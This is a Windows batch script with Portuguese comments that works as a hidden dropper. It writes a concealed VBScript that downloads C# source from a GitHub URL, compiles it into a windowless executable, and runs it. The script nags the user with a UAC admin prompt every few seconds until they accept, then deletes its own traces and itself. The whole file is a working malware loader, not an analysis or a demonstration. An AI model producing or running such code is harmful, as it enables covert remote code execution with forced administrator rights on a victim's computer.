@echo off
:: =============================================================
:: Este BAT cria um VBScript oculto que faz todo o trabalho
:: O CMD fecha instantaneamente e o VBS roda em segundo plano
:: =============================================================

:: Criar o script VBS que roda 100%% oculto
echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\motor.vbs"
echo Set fso = CreateObject("Scripting.FileSystemObject") >> "%temp%\motor.vbs"
echo. >> "%temp%\motor.vbs"
echo ' URLs e caminhos >> "%temp%\motor.vbs"
echo githubURL = "https://raw.githubusercontent.com/espertin/wind/main/TrolagemHacker_GitHub.cs?nocache=" ^& Timer >> "%temp%\motor.vbs"
echo tempCS = WshShell.ExpandEnvironmentStrings("%%temp%%") ^& "\TrolagemHacker.cs" >> "%temp%\motor.vbs"
echo tempEXE = WshShell.ExpandEnvironmentStrings("%%temp%%") ^& "\TrolagemHacker.exe" >> "%temp%\motor.vbs"
echo flagFile = WshShell.ExpandEnvironmentStrings("%%temp%%") ^& "\admin_ok.flag" >> "%temp%\motor.vbs"
echo batAdmin = WshShell.ExpandEnvironmentStrings("%%temp%%") ^& "\run_admin.bat" >> "%temp%\motor.vbs"
echo. >> "%temp%\motor.vbs"
echo ' Criar o BAT que sera executado como Admin >> "%temp%\motor.vbs"
echo Set f = fso.CreateTextFile(batAdmin, True) >> "%temp%\motor.vbs"
echo f.WriteLine "@echo off" >> "%temp%\motor.vbs"
echo f.WriteLine "echo OK > """ ^& flagFile ^& """" >> "%temp%\motor.vbs"
echo f.WriteLine "set ""CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe""" >> "%temp%\motor.vbs"
echo f.WriteLine "if not exist ""%%CSC%%"" set ""CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe""" >> "%temp%\motor.vbs"
echo f.WriteLine "powershell -WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" ^& githubURL ^& "', '" ^& tempCS ^& "')""" >> "%temp%\motor.vbs"
echo f.WriteLine "if exist """ ^& tempCS ^& """ ""%%CSC%%"" /nologo /target:winexe /out:""" ^& tempEXE ^& """ """ ^& tempCS ^& """ >nul 2>&1" >> "%temp%\motor.vbs"
echo f.WriteLine "if exist """ ^& tempEXE ^& """ start """" """ ^& tempEXE ^& """" >> "%temp%\motor.vbs"
echo f.WriteLine "del /f /q """ ^& tempCS ^& """ >nul 2>&1" >> "%temp%\motor.vbs"
echo f.WriteLine "del /f /q ""%%~f0"" >nul 2>&1" >> "%temp%\motor.vbs"
echo f.WriteLine "exit" >> "%temp%\motor.vbs"
echo f.Close >> "%temp%\motor.vbs"
echo. >> "%temp%\motor.vbs"
echo ' Deletar flag antiga >> "%temp%\motor.vbs"
echo If fso.FileExists(flagFile) Then fso.DeleteFile(flagFile) >> "%temp%\motor.vbs"
echo. >> "%temp%\motor.vbs"
echo ' LOOP INFINITO: Pedir Admin ate aceitar >> "%temp%\motor.vbs"
echo Set objShell = CreateObject("Shell.Application") >> "%temp%\motor.vbs"
echo Do While Not fso.FileExists(flagFile) >> "%temp%\motor.vbs"
echo     objShell.ShellExecute batAdmin, "", "", "runas", 0 >> "%temp%\motor.vbs"
echo     WScript.Sleep 2500 >> "%temp%\motor.vbs"
echo Loop >> "%temp%\motor.vbs"
echo. >> "%temp%\motor.vbs"
echo ' Admin aceito! Limpar rastros >> "%temp%\motor.vbs"
echo WScript.Sleep 1000 >> "%temp%\motor.vbs"
echo If fso.FileExists(flagFile) Then fso.DeleteFile(flagFile) >> "%temp%\motor.vbs"

:: Executar o VBS em modo oculto e fechar o CMD instantaneamente
start "" /min cscript //nologo "%temp%\motor.vbs"

:: Autodestruir o BAT original
(goto) 2>nul & del /f /q "%~f0"
exit
